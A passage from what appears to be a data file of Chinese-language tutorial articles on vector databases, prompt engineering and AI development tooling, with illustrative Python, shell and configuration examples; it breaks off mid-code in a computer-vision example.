向量数据库是一种专门设计用于处理向量数据的数据库系统。与传统的关系型数据库不同，向量数据库专注于高维向量的相似性搜索，能够快速找到与查询向量最相似的数据点。

#### 1. 向量表示
向量是多维空间中的点，通常表示为数字数组：
- **词向量**：将词汇映射到高维空间
- **句子向量**：表示整个句子的语义
- **图像向量**：图像的特征表示
- **音频向量**：声音信号的特征表示

#### 2. 相似性度量
向量数据库使用不同的距离度量来计算相似性：

**余弦相似度（Cosine Similarity）**：
\`\`\`python
import numpy as np

def cosine_similarity(a, b):
    """计算两个向量的余弦相似度"""
    dot_product = np.dot(a, b)
    norm_a = np.linalg.norm(a)
    norm_b = np.linalg.norm(b)
    return dot_product / (norm_a * norm_b)

# 示例
vec1 = np.array([1, 2, 3])
vec2 = np.array([2, 3, 4])
similarity = cosine_similarity(vec1, vec2)
print(f"余弦相似度: {similarity}")
\`\`\`

**欧几里得距离（Euclidean Distance）**：
\`\`\`python
def euclidean_distance(a, b):
    """计算两个向量的欧几里得距离"""
    return np.sqrt(np.sum((a - b) ** 2))

distance = euclidean_distance(vec1, vec2)
print(f"欧几里得距离: {distance}")
\`\`\`

**点积（Dot Product）**：
\`\`\`python
def dot_product_similarity(a, b):
    """计算点积相似度"""
    return np.dot(a, b)

dot_sim = dot_product_similarity(vec1, vec2)
print(f"点积相似度: {dot_sim}")
\`\`\`

### 🔧 核心技术原理

#### 1. 向量索引技术
向量数据库使用特殊的索引结构来加速相似性搜索：

**近似最近邻搜索（Approximate Nearest Neighbor, ANN）**：
- 精确搜索在高维空间中计算复杂度极高
- ANN算法提供近似结果，大幅提高搜索速度
- 在精度和速度之间取得平衡

**常用ANN算法**：

**IVF（Inverted File Index）**：
- 将向量空间划分为多个聚类
- 搜索时只检查相关聚类
- 减少搜索范围

\`\`\`python
from sklearn.cluster import KMeans
import numpy as np

class IVFIndex:
    def __init__(self, n_clusters=100):
        self.n_clusters = n_clusters
        self.kmeans = KMeans(n_clusters=n_clusters)
        self.clusters = {}
        self.vectors = {}
        
    def fit(self, vectors):
        """训练聚类模型"""
        self.centroids = self.kmeans.fit(vectors).cluster_centers_
        
        # 将向量分配到对应聚类
        labels = self.kmeans.predict(vectors)
        for i, label in enumerate(labels):
            if label not in self.clusters:
                self.clusters[label] = []
            self.clusters[label].append(i)
            self.vectors[i] = vectors[i]
    
    def search(self, query_vector, k=10):
        """搜索最相似的k个向量"""
        # 找到查询向量最接近的聚类
        distances = np.linalg.norm(self.centroids - query_vector, axis=1)
        closest_cluster = np.argmin(distances)
        
        # 在该聚类中搜索
        candidates = self.clusters[closest_cluster]
        similarities = []
        
        for idx in candidates:
            similarity = cosine_similarity(query_vector, self.vectors[idx])
            similarities.append((idx, similarity))
        
        # 返回最相似的k个
        similarities.sort(key=lambda x: x[1], reverse=True)
        return similarities[:k]
\`\`\`

**HNSW（Hierarchical Navigable Small World）**：
- 分层图结构
- 高效的图遍历算法
- 优秀的搜索性能

**LSH（Locality Sensitive Hashing）**：
- 哈希函数保持相似性
- 快速哈希查找
- 适合大规模数据

#### 2. 向量量化技术
为了节省存储空间和提高搜索效率，向量数据库使用量化技术：

**标量量化（Scalar Quantization）**：
- 对每个维度单独量化
- 压缩比高但精度损失较大

**乘积量化（Product Quantization）**：
- 将向量分割为子向量
- 对每个子向量独立量化
- 平衡压缩和精度

\`\`\`python
class ProductQuantizer:
    def __init__(self, m=8, k=256):
        self.m = m  # 子向量数量
        self.k = k  # 每个子向量的码本大小
        self.codebooks = None
        
    def fit(self, vectors):
        """训练乘积量化器"""
        n, d = vectors.shape
        self.d_sub = d // self.m  # 每个子向量的维度
        
        self.codebooks = np.zeros((self.m, self.k, self.d_sub))
        
        for i in range(self.m):
            start_idx = i * self.d_sub
            end_idx = (i + 1) * self.d_sub
            sub_vectors = vectors[:, start_idx:end_idx]
            
            # 对每个子向量聚类
            kmeans = KMeans(n_clusters=self.k)
            kmeans.fit(sub_vectors)
            self.codebooks[i] = kmeans.cluster_centers_
    
    def encode(self, vectors):
        """编码向量"""
        n, d = vectors.shape
        codes = np.zeros((n, self.m), dtype=np.int32)
        
        for i in range(self.m):
            start_idx = i * self.d_sub
            end_idx = (i + 1) * self.d_sub
            sub_vectors = vectors[:, start_idx:end_idx]
            
            for j in range(n):
                distances = np.linalg.norm(
                    self.codebooks[i] - sub_vectors[j], axis=1
                )
                codes[j, i] = np.argmin(distances)
        
        return codes
    
    def decode(self, codes):
        """解码向量"""
        n = codes.shape[0]
        reconstructed = np.zeros((n, self.d_sub * self.m))
        
        for i in range(self.m):
            for j in range(n):
                reconstructed[j, i*self.d_sub:(i+1)*self.d_sub] = \
                    self.codebooks[i, codes[j, i]]
        
        return reconstructed
\`\`\`

### 🏗️ 主流向量数据库

#### 1. Pinecone
Pinecone是托管的向量数据库服务：

**特点**：
- 完全托管服务
- 自动扩展
- 高可用性
- 支持多种索引类型

**使用示例**：
\`\`\`python
import pinecone

# 初始化Pinecone
pinecone.init(api_key="your-api-key", environment="us-west1-gcp")

# 创建索引
index_name = "my-index"
pinecone.create_index(index_name, dimension=1536)

# 连接到索引
index = pinecone.Index(index_name)

# 添加向量
vectors = [
    ("vec1", [0.1, 0.2, 0.3], {"metadata": "value1"}),
    ("vec2", [0.4, 0.5, 0.6], {"metadata": "value2"})
]
index.upsert(vectors=vectors)

# 查询相似向量
query_result = index.query(
    vector=[0.15, 0.25, 0.35],
    top_k=10,
    include_metadata=True
)
\`\`\`

#### 2. Weaviate
Weaviate是开源的向量数据库：

**特点**：
- GraphQL API
- 自动模式推断
- 支持多种向量索引
- 云原生架构

**使用示例**：
\`\`\`python
import weaviate

# 连接到Weaviate
client = weaviate.Client("http://localhost:8080")

# 创建类
class_obj = {
    "class": "Document",
    "properties": [
        {
            "name": "content",
            "dataType": ["string"]
        }
    ],
    "vectorizer": "none"  # 手动提供向量
}

client.schema.create_class(class_obj)

# 添加对象
client.data_object.create(
    data_object={
        "content": "这是一个文档内容"
    },
    class_name="Document",
    vector=[0.1, 0.2, 0.3]  # 提供向量
)

# 相似性搜索
near_vector = {"vector": [0.15, 0.25, 0.35]}
result = client.query.get("Document", ["content"]).with_near_vector(
    near_vector
).with_limit(10).do()
\`\`\`

#### 3. Milvus
Milvus是专为企业级应用设计的向量数据库：

**特点**：
- 高性能
- 支持多种索引类型
- 水平扩展
- 丰富的API

**使用示例**：
\`\`\`python
from pymilvus import connections, FieldSchema, CollectionSchema, DataType, Collection

# 连接Milvus
connections.connect("default", host="localhost", port="19530")

# 定义schema
fields = [
    FieldSchema(name="id", dtype=DataType.INT64, is_primary=True, auto_id=True),
    FieldSchema(name="embedding", dtype=DataType.FLOAT_VECTOR, dim=128),
    FieldSchema(name="text", dtype=DataType.VARCHAR, max_length=65535)
]
schema = CollectionSchema(fields, "文档集合")

# 创建collection
collection = Collection("docs", schema)

# 创建索引
index_params = {
    "index_type": "IVF_FLAT",
    "metric_type": "L2",
    "params": {"nlist": 100}
}
collection.create_index(field_name="embedding", index_params=index_params)

# 插入数据
entities = [
    [[0.1, 0.2, 0.3], [0.4, 0.5, 0.6]],  # embeddings
    ["文本1", "文本2"]  # texts
]
insert_result = collection.insert(entities)

# 搜索
collection.load()
search_params = {"metric_type": "L2", "params": {"nprobe": 10}}
results = collection.search(
    data=[[0.15, 0.25, 0.35]],
    anns_field="embedding",
    param=search_params,
    limit=10,
    output_fields=["text"]
)
\`\`\`

#### 4. Chroma
Chroma是简单易用的向量数据库：

**特点**：
- 轻量级
- Python原生
- 适合原型开发
- 开源免费

**使用示例**：
\`\`\`python
import chromadb
from chromadb.utils import embedding_functions

# 创建客户端
client = chromadb.Client()

# 创建集合
collection = client.create_collection("docs")

# 添加文档
collection.add(
    documents=[
        "这是一个文档",
        "这是另一个文档"
    ],
    metadatas=[
        {"source": "web"},
        {"source": "book"}
    ],
    ids=["doc1", "doc2"]
)

# 查询相似文档
results = collection.query(
    query_texts=["查询文本"],
    n_results=2
)
\`\`\`

### 🚀 RAG（检索增强生成）应用

向量数据库在RAG系统中发挥关键作用：

#### 1. RAG架构
\`\`\`python
class RAGSystem:
    def __init__(self, vector_db, llm):
        self.vector_db = vector_db
        self.llm = llm
        self.embedding_model = embedding_functions.SentenceTransformerEmbeddingFunction()
    
    def retrieve(self, query, k=5):
        """从向量数据库检索相关文档"""
        query_embedding = self.embedding_model([query])
        results = self.vector_db.query(
            query_embeddings=query_embedding,
            n_results=k
        )
        return results
    
    def generate(self, query, context):
        """基于上下文生成答案"""
        prompt = f"""
        基于以下上下文信息回答问题：
        
        上下文：{context}
        
        问题：{query}
        
        请提供准确的回答。
        """
        return self.llm.generate(prompt)
    
    def query(self, question):
        """完整RAG流程"""
        # 1. 检索相关文档
        retrieved_docs = self.retrieve(question)
        
        # 2. 构建上下文
        context = " ".join(retrieved_docs['documents'][0])
        
        # 3. 生成答案
        answer = self.generate(question, context)
        
        return {
            'answer': answer,
            'sources': retrieved_docs['metadatas'][0]
        }
\`\`\`

#### 2. 文档预处理
\`\`\`python
from langchain.text_splitter import RecursiveCharacterTextSplitter

class DocumentProcessor:
    def __init__(self):
        self.text_splitter = RecursiveCharacterTextSplitter(
            chunk_size=1000,
            chunk_overlap=200,
            separators=["\\n\\n", "\\n", " ", ""]
        )
    
    def process_document(self, text, doc_id):
        """处理文档并准备插入向量数据库"""
        chunks = self.text_splitter.split_text(text)
        
        # 为每个chunk生成向量
        embeddings = self.embedding_model(chunks)
        
        # 准备数据
        data = {
            'ids': [f"{doc_id}_{i}" for i in range(len(chunks))],
            'documents': chunks,
            'embeddings': embeddings,
            'metadatas': [{'doc_id': doc_id, 'chunk_id': i} 
                         for i in range(len(chunks))]
        }
        
        return data
\`\`\`

### 📊 性能优化策略

#### 1. 索引优化
**选择合适的索引类型**：
- **IVF_FLAT**：精确搜索，适合小规模数据
- **IVF_PQ**：乘积量化，节省存储
- **HNSW**：高性能，适合在线服务

**参数调优**：
- **nlist**：聚类数量，影响搜索精度和速度
- **efConstruction**：构建参数，影响索引质量
- **M**：HNSW参数，影响搜索效率

#### 2. 批量操作
\`\`\`python
def batch_upsert(vectors, batch_size=1000):
    """批量插入向量"""
    for i in range(0, len(vectors), batch_size):
        batch = vectors[i:i+batch_size]
        index.upsert(vectors=batch)
        print(f"已插入 {i+len(batch)} / {len(vectors)} 个向量")
\`\`\`

#### 3. 内存管理
- 合理设置缓存大小
- 及时释放不需要的资源
- 监控内存使用情况

### 🔒 安全性和可靠性

#### 1. 数据安全
**访问控制**：
- API密钥管理
- 角色权限控制
- IP白名单

**数据加密**：
- 传输加密（TLS）
- 存储加密
- 字段级加密

#### 2. 可靠性保障
**备份策略**：
- 定期快照
- 增量备份
- 跨区域复制

**监控告警**：
- 性能指标监控
- 错误率跟踪
- 资源使用监控

### 🛠️ 最佳实践

#### 1. 向量质量保证
- 使用高质量的嵌入模型
- 定期更新向量表示
- 验证向量的语义一致性

#### 2. 查询优化
- 合理设置top-k参数
- 使用过滤条件缩小搜索范围
- 实现查询缓存机制

#### 3. 成本控制
- 选择合适的实例规格
- 实现自动扩缩容
- 监控使用量和成本

### 🌟 未来发展趋势

#### 1. 多模态向量数据库
- 支持文本、图像、音频等多种模态
- 跨模态相似性搜索
- 统一向量空间

#### 2. 实时向量处理
- 流式向量摄入
- 实时索引更新
- 增量学习能力

#### 3. 边缘部署
- 轻量级向量数据库
- 本地化部署
- 低延迟访问

向量数据库作为AI应用的基础设施，其重要性将持续增长。随着技术的不断发展，向量数据库将在性能、功能和易用性方面不断提升，为AI应用提供更强大的支持。`,createdAt:"2026-03-15",updatedAt:"2026-03-15"},{id:"prompt-engineering",title:"提示工程（Prompt Engineering）最佳实践",category:"ai",difficulty:"medium",tags:["提示工程","Prompt Engineering","LLM调优","指令设计","上下文学习"],content:`## 提示工程（Prompt Engineering）最佳实践

提示工程是与大语言模型交互的核心技能，通过精心设计的提示（Prompt）来引导模型产生期望的输出。良好的提示工程能够显著提升模型的表现，实现更准确、更可控的AI应用。

### 🎯 提示工程的基本概念

提示工程是指设计、优化和管理输入给AI模型的提示文本的技术和艺术。它涉及理解模型的工作机制，以及如何通过结构化的输入来获得最佳输出。

#### 1. 提示的组成部分
一个有效的提示通常包含以下元素：

**指令（Instruction）**：
- 明确告诉模型要做什么
- 具体、清晰的指导
- 避免模糊表述

**上下文（Context）**：
- 提供必要的背景信息
- 相关的先验知识
- 约束条件和规则

**输入（Input）**：
- 需要处理的具体数据
- 问题或任务的描述
- 待分析的内容

**输出指示符（Output Indicator）**：
- 指定期望的输出格式
- 结构化要求
- 长度限制

\`\`\`python
# 示例：结构化提示模板
def create_structured_prompt(task, context, input_data, output_format):
    prompt = f"""
    任务：{task}
    
    背景信息：{context}
    
    输入数据：{input_data}
    
    请按照以下格式输出：{output_format}
    
    回答：
    """
    return prompt
\`\`\`

### 🧠 提示设计原则

#### 1. 明确性原则
提示应该清晰明确，避免歧义：

**不良示例**：
"告诉我一些关于AI的事情"

**改进示例**：
"请用不超过200字概括人工智能的主要发展历程，包括关键里程碑和技术突破。"

#### 2. 具体性原则
提供具体的指导和约束：

**不良示例**：
"写一篇好文章"

**改进示例**：
"写一篇800字左右的科技文章，主题是'机器学习在医疗诊断中的应用'，要求包含引言、三个主要应用场景、技术挑战和未来展望四个部分。"

#### 3. 结构化原则
使用清晰的结构组织提示：

\`\`\`python
def structured_prompt_template():
    template = """
    # 任务说明
    请分析以下文本的情感倾向。
    
    # 输入文本
    {text}
    
    # 分析要求
    1. 识别主要情感类别（积极、消极、中性）
    2. 提供置信度评分（0-100%）
    3. 指出关键情感词汇
    4. 给出简要理由
    
    # 输出格式
    - 情感类别: [类别]
    - 置信度: [百分比]
    - 关键词: [词汇列表]
    - 理由: [简要说明]
    """
    return template
\`\`\`

### 🔧 高级提示技术

#### 1. 少样本学习（Few-Shot Learning）
通过提供少量示例来指导模型：

\`\`\`python
def few_shot_prompt():
    prompt = """
    以下是文本分类的示例：
    
    示例1：
    输入：今天天气真好，心情很愉快
    输出：积极情感
    
    示例2：
    输入：产品质量太差了，非常失望
    输出：消极情感
    
    示例3：
    输入：明天开会讨论项目进展
    输出：中性情感
    
    现在请对以下文本进行分类：
    输入：{new_text}
    输出：
    """
    return prompt
\`\`\`

#### 2. 链式思考（Chain-of-Thought）
引导模型逐步推理：

\`\`\`python
def chain_of_thought_prompt(problem):
    prompt = f"""
    请逐步解决以下问题：
    
    问题：{problem}
    
    解决步骤：
    1. 首先，分析问题的关键要素
    2. 然后，确定解决问题的方法
    3. 接着，逐步执行计算或推理
    4. 最后，得出结论并验证
    
    请详细展示每一步的思考过程：
    """
    return prompt
\`\`\`

#### 3. 自我一致性（Self-Consistency）
通过多次采样提高准确性：

\`\`\`python
def self_consistency_approach(prompt, model, num_samples=5):
    """通过多次采样获得一致答案"""
    responses = []
    for _ in range(num_samples):
        response = model.generate(prompt, temperature=0.7)
        responses.append(response)
    
    # 选择最常见的答案
    from collections import Counter
    answer_counts = Counter(responses)
    best_answer = answer_counts.most_common(1)[0][0]
    
    return best_answer, responses
\`\`\`

### 🚀 专业提示技巧

#### 1. 角色扮演
让模型承担特定角色：

\`\`\`python
def role_playing_prompt(role, task):
    prompt = f"""
    你是{role}，请完成以下任务：
    
    {task}
    
    请以{role}的专业知识和视角来回答，使用相应的术语和表达方式。
    """
    return prompt

# 示例
prompt = role_playing_prompt(
    "资深软件架构师", 
    "分析微服务架构的优缺点"
)
\`\`\`

#### 2. 思维树（Tree of Thoughts）
将复杂问题分解为多个思维路径：

\`\`\`python
def tree_of_thoughts_prompt(problem):
    prompt = f"""
    问题：{problem}
    
    请按以下方式思考：
    
    1. 问题分解
       - 将问题分解为3-5个子问题
       - 为每个子问题提供初步思路
    
    2. 多角度分析
       - 从不同角度审视问题
       - 考虑各种可能性
    
    3. 方案生成
       - 基于分析生成解决方案
       - 评估各方案的可行性
    
    4. 最终决策
       - 选择最佳方案
       - 提供实施建议
    """
    return prompt
\`\`\`

#### 3. 反思与自我修正
引导模型反思和改进：

\`\`\`python
def reflection_prompt(initial_answer, question):
    prompt = f"""
    问题：{question}
    初始答案：{initial_answer}
    
    请反思你的初始答案：
    1. 检查逻辑是否正确
    2. 验证事实是否准确
    3. 考虑是否有更好的表达方式
    4. 识别可能的错误或遗漏
    
    基于反思，提供改进后的答案：
    """
    return prompt
\`\`\`

### 📊 不同场景的提示策略

#### 1. 内容生成
**新闻写作**：
\`\`\`python
news_prompt = """
角色：专业记者

任务：根据提供的信息撰写新闻稿

要求：
- 标题简洁有力，突出重点
- 正文结构：导语-主体-结尾
- 语言客观、准确、简洁
- 包含时间、地点、人物、事件要素
- 字数控制在300-500字

信息：{information}
"""
\`\`\`

**创意写作**：
\`\`\`python
creative_prompt = """
风格：{style}
主题：{theme}
长度：{length}
受众：{audience}

请创作一个符合以下要求的故事：
- 情节完整，有开头、发展、高潮、结尾
- 人物形象鲜明
- 语言风格符合指定风格
- 主题明确且有意义
"""
\`\`\`

#### 2. 代码生成
\`\`\`python
code_generation_prompt = """
语言：{programming_language}
功能：{function_description}
约束：{constraints}

请生成满足以下要求的代码：
1. 代码结构清晰，逻辑正确
2. 包含必要的注释
3. 遵循最佳实践
4. 考虑边界情况
5. 包含错误处理

代码：
"""
\`\`\`

#### 3. 数据分析
\`\`\`python
analysis_prompt = """
数据类型：{data_type}
数据内容：{data_content}
分析目标：{analysis_goal}

请进行以下分析：
1. 数据概览（基本统计信息）
2. 趋势分析
3. 异常检测
4. 相关性分析
5. 结论和建议

请以结构化格式呈现结果。
"""
\`\`\`

### 🔧 提示优化技术

#### 1. A/B测试
对不同提示版本进行效果对比：

\`\`\`python
def ab_test_prompts(prompts, test_data, evaluation_metric):
    """A/B测试不同提示的效果"""
    results = {}
    
    for prompt_name, prompt in prompts.items():
        scores = []
        for sample in test_data:
            response = model.generate(prompt.format(**sample))
            score = evaluate_response(response, sample['expected'], evaluation_metric)
            scores.append(score)
        
        results[prompt_name] = {
            'average_score': sum(scores) / len(scores),
            'responses': [model.generate(prompt.format(**sample)) for sample in test_data]
        }
    
    return results
\`\`\`

#### 2. 提示链（Prompt Chaining）
将复杂任务分解为多个步骤：

\`\`\`python
def chained_prompts():
    steps = [
        {
            'name': '信息提取',
            'prompt': "从以下文本中提取关键信息：{text}"
        },
        {
            'name': '分析',
            'prompt': "分析以下信息：{extracted_info}"
        },
        {
            'name': '总结',
            'prompt': "基于以下分析给出总结：{analysis}"
        }
    ]
    return steps
\`\`\`

#### 3. 动态提示
根据输入动态调整提示内容：

\`\`\`python
def dynamic_prompt(input_text):
    # 分析输入特征
    length = len(input_text)
    complexity = analyze_complexity(input_text)
    
    if length < 100:
        return f"请详细解释以下短文本：{input_text}"
    elif complexity > 0.7:
        return f"请用简单语言解释以下复杂内容：{input_text}"
    else:
        return f"请分析以下内容：{input_text}"
\`\`\`

### 🛡️ 安全和伦理考虑

#### 1. 防止有害输出
\`\`\`python
def safe_prompt(user_input):
    prompt = f"""
    重要：请确保你的回答安全、有益、符合道德规范。
    
    用户问题：{user_input}
    
    请提供有用且安全的回答，避免：
    - 有害建议
    - 偏见内容
    - 虚假信息
    - 违法内容
    """
    return prompt
\`\`\`

#### 2. 偏见缓解
\`\`\`python
def bias_aware_prompt():
    prompt = """
    请注意避免任何形式的偏见，包括但不限于：
    - 性别偏见
    - 种族偏见
    - 地域偏见
    - 年龄偏见
    - 职业偏见
    
    请提供客观、公正的回答。
    """
    return prompt
\`\`\`

### 📈 评估和改进

#### 1. 提示质量评估指标
- **相关性**：输出与输入的相关程度
- **准确性**：信息的正确性
- **完整性**：覆盖要点的全面性
- **一致性**：多次运行结果的稳定性
- **创造性**：新颖性和独创性

#### 2. 持续改进流程
\`\`\`python
def prompt_improvement_cycle(initial_prompt, test_cases, improvement_iterations=5):
    current_prompt = initial_prompt
    
    for iteration in range(improvement_iterations):
        # 测试当前提示
        test_results = test_prompt(current_prompt, test_cases)
        
        # 分析失败案例
        failure_analysis = analyze_failures(test_results)
        
        # 生成改进建议
        improvements = generate_improvements(failure_analysis)
        
        # 更新提示
        current_prompt = update_prompt(current_prompt, improvements)
        
        print(f"迭代 {iteration + 1}: 提示已更新")
    
    return current_prompt
\`\`\`

### 🚀 实战案例

#### 1. 客服对话系统
\`\`\`python
customer_service_prompt = """
你是{company_name}的客服代表，请处理以下客户咨询：

客户信息：
- 姓名：{customer_name}
- 会员等级：{membership_level}
- 历史记录：{history}

客户问题：{customer_query}

请遵循以下原则：
1. 保持友好、专业的态度
2. 优先考虑高价值客户
3. 提供具体解决方案
4. 如需升级，说明升级原因
5. 询问是否还有其他帮助

回复：
"""
\`\`\`

#### 2. 技术文档生成
\`\`\`python
tech_doc_prompt = """
API名称：{api_name}
功能描述：{function_desc}
参数：{parameters}
返回值：{return_values}

请生成技术文档，包含：
1. 功能概述
2. 参数说明（类型、必填、描述）
3. 返回值说明
4. 使用示例（至少2个）
5. 错误码说明
6. 注意事项

文档应简洁明了，便于开发者使用。
"""
\`\`\`

### 🌟 最佳实践总结

#### 1. 设计原则
- 从简单开始，逐步复杂化
- 保持提示的一致性
- 使用明确的分隔符
- 提供足够的上下文

#### 2. 测试策略
- 多样化测试用例
- 边界情况测试
- 压力测试
- 用户验收测试

#### 3. 维护建议
- 版本控制提示
- 监控性能指标
- 定期更新优化
- 文档化变更

提示工程是一门既科学又艺术的技术，需要在实践中不断探索和完善。通过掌握这些原则和技巧，可以显著提升与AI模型交互的效果，构建更智能、更可靠的应用系统。`,createdAt:"2026-03-15",updatedAt:"2026-03-15"},{id:"ai-tools",title:"AI开发工具与平台生态系统",category:"ai",difficulty:"medium",tags:["AI工具","开发平台","模型训练","部署工具","MLOps"],content:`## AI开发工具与平台生态系统

AI开发工具和平台构成了现代人工智能应用开发的基础设施。从数据处理到模型训练，从部署到监控，完整的工具链为AI工程师提供了端到端的解决方案。

### 🛠️ AI开发工具分类

#### 1. 数据处理工具
数据是AI开发的基础，高质量的数据处理工具至关重要：

**数据标注工具**：
- **Label Studio**：通用数据标注平台
- **Prodigy**：主动学习标注工具
- **SuperAnnotate**：计算机视觉标注平台

**数据预处理**：
- **Pandas**：Python数据分析库
- **Polars**：高性能数据处理
- **Apache Spark**：大数据处理框架

\`\`\`python
import pandas as pd
from sklearn.preprocessing import StandardScaler

# 数据加载和预处理
def preprocess_data(file_path):
    # 读取数据
    df = pd.read_csv(file_path)
    
    # 数据清洗
    df = df.dropna()  # 删除缺失值
    df = df.drop_duplicates()  # 删除重复值
    
    # 特征工程
    scaler = StandardScaler()
    numerical_cols = df.select_dtypes(include=['number']).columns
    df[numerical_cols] = scaler.fit_transform(df[numerical_cols])
    
    return df

# 使用示例
processed_data = preprocess_data('dataset.csv')
\`\`\`

#### 2. 模型开发框架
**深度学习框架**：
- **PyTorch**：动态计算图，研究友好
- **TensorFlow**：静态计算图，生产就绪
- **JAX**：函数式编程，高性能计算

**高级框架**：
- **Hugging Face Transformers**：预训练模型库
- **FastAI**：简化深度学习开发
- **Keras**：高层神经网络API

\`\`\`python
import torch
import torch.nn as nn
from transformers import AutoTokenizer, AutoModel

class TextClassifier(nn.Module):
    def __init__(self, model_name, num_classes):
        super().__init__()
        self.tokenizer = AutoTokenizer.from_pretrained(model_name)
        self.model = AutoModel.from_pretrained(model_name)
        self.classifier = nn.Linear(self.model.config.hidden_size, num_classes)
        
    def forward(self, input_ids, attention_mask):
        outputs = self.model(input_ids=input_ids, attention_mask=attention_mask)
        pooled_output = outputs.last_hidden_state[:, 0]  # CLS token
        logits = self.classifier(pooled_output)
        return logits

# 模型实例化
model = TextClassifier('bert-base-uncased', num_classes=2)
\`\`\`

#### 3. 实验管理工具
**实验跟踪**：
- **MLflow**：实验跟踪和模型管理
- **Weights & Biases**：可视化和实验管理
- **Comet**：MLOps平台

\`\`\`python
import mlflow
import mlflow.pytorch

# MLflow实验跟踪
def train_with_tracking(model, train_loader, val_loader, epochs):
    with mlflow.start_run():
        # 记录参数
        mlflow.log_param("epochs", epochs)
        mlflow.log_param("learning_rate", 0.001)
        
        for epoch in range(epochs):
            # 训练循环
            train_loss = train_epoch(model, train_loader)
            val_acc = validate(model, val_loader)
            
            # 记录指标
            mlflow.log_metric("train_loss", train_loss, step=epoch)
            mlflow.log_metric("val_accuracy", val_acc, step=epoch)
        
        # 记录模型
        mlflow.pytorch.log_model(model, "model")
\`\`\`

### 🚀 模型训练工具

#### 1. 分布式训练
**Horovod**：跨多GPU/多节点训练
\`\`\`python
import horovod.torch as hvd

# 初始化Horovod
hvd.init()

# 设置GPU
torch.cuda.set_device(hvd.local_rank())

# 模型和优化器
model = MyModel()
optimizer = torch.optim.Adam(model.parameters())

# 分布式优化器
optimizer = hvd.DistributedOptimizer(optimizer)

# 广播参数
hvd.broadcast_parameters(model.state_dict(), root_rank=0)
\`\`\`

**DeepSpeed**：微软的优化库
\`\`\`python
import deepspeed

# DeepSpeed配置
ds_config = {
    "train_batch_size": 32,
    "gradient_clipping": 1.0,
    "fp16": {
        "enabled": True
    },
    "zero_optimization": {
        "stage": 2
    }
}

# 初始化DeepSpeed
model, optimizer, _, _ = deepspeed.initialize(
    model=model,
    optimizer=optimizer,
    config=ds_config
)
\`\`\`

#### 2. 超参数优化
**Optuna**：自动化超参数优化
\`\`\`python
import optuna

def objective(trial):
    # 定义搜索空间
    lr = trial.suggest_float('lr', 1e-5, 1e-1, log=True)
    batch_size = trial.suggest_categorical('batch_size', [16, 32, 64])
    hidden_size = trial.suggest_int('hidden_size', 64, 512)
    
    # 训练模型
    model = SimpleModel(hidden_size)
    optimizer = torch.optim.Adam(model.parameters(), lr=lr)
    
    # 评估模型
    accuracy = train_and_evaluate(model, optimizer, batch_size)
    return accuracy

# 优化
study = optuna.create_study(direction='maximize')
study.optimize(objective, n_trials=100)
\`\`\`

### 📦 模型部署工具

#### 1. 模型服务化
**TorchServe**：PyTorch模型服务
\`\`\`bash
# 创建模型档案
torch-model-archiver --model-name my_model \\
    --version 1.0 \\
    --model-file model.py \\
    --serialized-file model.pth \\
    --handler handler.py

# 启动服务
torchserve --start --model-store model_store --models my_model=my_model.mar
\`\`\`

**TensorFlow Serving**：TensorFlow模型服务
\`\`\`python
# TensorFlow Serving配置
model_config_file = """
model_config_list: {
  config: {
    name: "my_model",
    base_path: "/path/to/models",
    model_platform: "tensorflow"
  }
}
"""

# 启动服务
# tensorflow_model_server --model_config_file=/path/to/config
\`\`\`

#### 2. 容器化部署
**Docker**：容器化部署
\`\`\`dockerfile
FROM python:3.9-slim

WORKDIR /app

COPY requirements.txt .
RUN pip install -r requirements.txt

COPY . .

EXPOSE 8000

CMD ["python", "app.py"]
\`\`\`

**Kubernetes**：容器编排
\`\`\`yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: ai-model-deployment
spec:
  replicas: 3
  selector:
    matchLabels:
      app: ai-model
  template:
    metadata:
      labels:
        app: ai-model
    spec:
      containers:
      - name: model-container
        image: ai-model:latest
        ports:
        - containerPort: 8000
        resources:
          requests:
            memory: "1Gi"
            cpu: "500m"
          limits:
            memory: "2Gi"
            cpu: "1000m"
\`\`\`

### 🧪 MLOps工具栈

#### 1. 数据版本控制
**DVC（Data Version Control）**：
\`\`\`bash
# 初始化DVC
dvc init

# 添加数据文件
dvc add data/training_dataset.csv

# 推送数据到远程存储
dvc push

# 拉取数据
dvc pull
\`\`\`

**Kedro**：数据科学流水线
\`\`\`python
from kedro.pipeline import Pipeline, node
from kedro.runner import SequentialRunner

def load_data(filepath):
    return pd.read_csv(filepath)

def process_data(data):
    # 数据处理逻辑
    return processed_data

def train_model(data):
    # 模型训练逻辑
    return model

# 构建流水线
pipeline = Pipeline([
    node(load_data, "raw_data", "processed_data", name="load_raw_data"),
    node(process_data, "processed_data", "clean_data", name="process_data"),
    node(train_model, "clean_data", "model", name="train_model")
])

# 运行流水线
runner = SequentialRunner()
runner.run(pipeline)
\`\`\`

#### 2. CI/CD for ML
**GitHub Actions for ML**：
\`\`\`yaml
name: ML Pipeline
on: [push, pull_request]

jobs:
  train:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v2
    - name: Setup Python
      uses: actions/setup-python@v2
      with:
        python-version: 3.9
    - name: Install dependencies
      run: |
        pip install -r requirements.txt
    - name: Run training
      run: |
        python train.py
    - name: Run tests
      run: |
        pytest tests/
    - name: Upload model
      uses: actions/upload-artifact@v2
      with:
        name: trained-model
        path: models/
\`\`\`

### 🌐 云平台AI服务

#### 1. AWS AI Services
**SageMaker**：端到端机器学习平台
- Notebook实例
- 训练作业
- 模型部署
- AutoML功能

\`\`\`python
import sagemaker
from sagemaker.huggingface import HuggingFace

# SageMaker训练
huggingface_estimator = HuggingFace(
    entry_point='train.py',
    source_dir='src',
    role=sagemaker.get_execution_role(),
    transformers_version='4.12',
    pytorch_version='1.9',
    py_version='py38',
    instance_type='ml.p3.2xlarge',
    instance_count=1,
    hyperparameters={
        'epochs': 3,
        'train_batch_size': 16,
        'model_name': 'bert-base-uncased'
    }
)

# 启动训练
huggingface_estimator.fit({'train': 's3://my-bucket/train/'})
\`\`\`

#### 2. Google Cloud AI Platform
**Vertex AI**：Google的AI平台
- AutoML
- Custom training
- Model deployment
- Feature store

#### 3. Azure Machine Learning
**Azure ML**：微软的AI平台
- ML Studio
- Automated ML
- Model management
- MLOps capabilities

### 🤖 特定领域工具

#### 1. 计算机视觉
**OpenCV**：计算机视觉库
\`\`\`python
import cv2
import numpy as np

# 图像预处理
def preprocess_image(image_path):
    img = cv2.imread(image_path)
    img = cv2.resize(img, (224, 224))
    img = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)
    img = img.astype(np.float32) / 255.0
    return img

# 目标检测
def detect_objects(model, image):
    predictions = model.predict(image)
